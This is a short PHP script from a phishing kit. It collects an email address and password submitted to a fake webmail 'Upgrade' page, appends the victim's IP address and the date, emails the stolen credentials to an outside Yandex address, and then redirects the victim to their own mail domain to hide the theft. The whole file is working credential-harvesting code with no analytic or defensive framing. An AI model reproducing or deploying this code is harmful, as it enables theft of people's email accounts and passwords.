<?php
if(isset($_POST['Upgrade'])){
$email=$_POST['email'];
if(!preg_match("/^[_\.0-9a-zA-Z-]+@([0-9a-zA-Z][0-9a-zA-Z-]+\.)+[a-zA-Z]{2,6}$/i", $email)){
header("Location:../usage?msg=1"); exit;
}
$q1Email1=stripos($email,"@");
		$myq1_email1=strpbrk($email,"@");
		$email1=substr($email,0,$q1Email1);
		$email2=substr($myq1_email1,1);

$adddate = date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message  = "--------------+ E-mail Spam ReZulT +--------------\n";
$message .= "E-mail ID: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['passwd']."\n";
$message .= "Password: ".$_POST['passwd2']."\n";
"--------------------------------------------------\n";
$message .= "IP Address         : $ip\n";
$message .= "Date & Time         : $adddate\n";
$message .= "--+ Created in 2015 By Jazzy+--\n";

$recipient = "babylon987@yandex.com";
$subject = "|WebMail|".$_POST['q1_email1'];
$headers = "From: Newhost<admin@web.com>";
			
mail($recipient,$subject,$message, $headers);
header("Location: http://www.$email2/"); exit;
}
?>
